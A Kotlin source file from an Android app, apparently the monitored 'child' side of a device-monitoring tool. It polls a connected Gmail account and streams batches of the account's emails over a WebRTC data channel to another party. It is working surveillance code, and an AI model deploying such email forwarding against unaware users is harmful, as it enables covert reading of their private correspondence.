package nexus.android.child.gmail

import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.webrtc.DataChannel
import java.nio.ByteBuffer

class GmailSyncManager(
    private val context: Context,
    private val repository: GmailRepository
) {

    companion object {
        private const val TAG = "GmailSyncManager"
        private const val INITIAL_LIMIT = 25
        private const val POLL_INTERVAL_MS = 5 * 60 * 1000L
        private const val MAX_CHUNK_SIZE = 8192
        private const val BATCH_SIZE = 20
    }

    private var job: Job? = null

    fun start(scope: CoroutineScope, dataChannel: DataChannel) {
        if (job?.isActive == true) return
        if (!GmailAuthRepository.isConnected(context)) return

        job = scope.launch(Dispatchers.IO) {
            var initialDone = GmailSyncStateStore.getLastInternalDate(context) > 0L
            while (isActive && GmailAuthRepository.isConnected(context)) {
                try {
                    if (dataChannel.state() != DataChannel.State.OPEN) {
                        delay(1000L)
                        continue
                    }

                    val emails = if (!initialDone) {
                        initialDone = true
                        repository.fetchInitial(INITIAL_LIMIT)
                    } else {
                        repository.fetchIncremental()
                    }

                    if (emails.isNotEmpty()) {
                        val account = GmailAuthRepository.getAccountEmail(context) ?: ""
                        if (account.isNotBlank()) {
                            sendEmailsBatched(dataChannel, account, emails)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Sync loop error", e)
                }

                delay(POLL_INTERVAL_MS)
            }
        }
    }

    fun stop() {
        job?.cancel()
        job = null
    }

    private fun getChildId(): String {
        return try {
            val prefs = context.getSharedPreferences("phantom_prefs", Context.MODE_PRIVATE)
            prefs.getString("device_id", "CHILD-UNKNOWN") ?: "CHILD-UNKNOWN"
        } catch (_: Exception) {
            "CHILD-UNKNOWN"
        }
    }

    private fun sendEmailsBatched(
        dataChannel: DataChannel,
        account: String,
        emails: List<GmailEmail>
    ) {
        val childId = getChildId()
        var index = 0
        while (index < emails.size && dataChannel.state() == DataChannel.State.OPEN) {
            val end = (index + BATCH_SIZE).coerceAtMost(emails.size)
            val slice = emails.subList(index, end)
            val payload = GmailBatchPayload(
                childId = childId,
                account = account,
                emails = slice
            )
            val json = GmailJson.toJson(payload)
            sendJson(dataChannel, json)
            index = end
        }
    }

    private fun sendJson(dataChannel: DataChannel, json: String) {
        val bytes = json.toByteArray(Charsets.UTF_8)
        var offset = 0
        while (offset < bytes.size && dataChannel.state() == DataChannel.State.OPEN) {
            val remaining = bytes.size - offset
            val chunkSize = remaining.coerceAtMost(MAX_CHUNK_SIZE)
            val buffer = ByteBuffer.wrap(bytes, offset, chunkSize)
            val sent = try {
                dataChannel.send(DataChannel.Buffer(buffer, false))
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send Gmail chunk", e)
                false
            }
            if (!sent) {
                Log.w(TAG, "Stopping Gmail send due to send() failure")
                return
            }
            offset += chunkSize
        }
    }
}
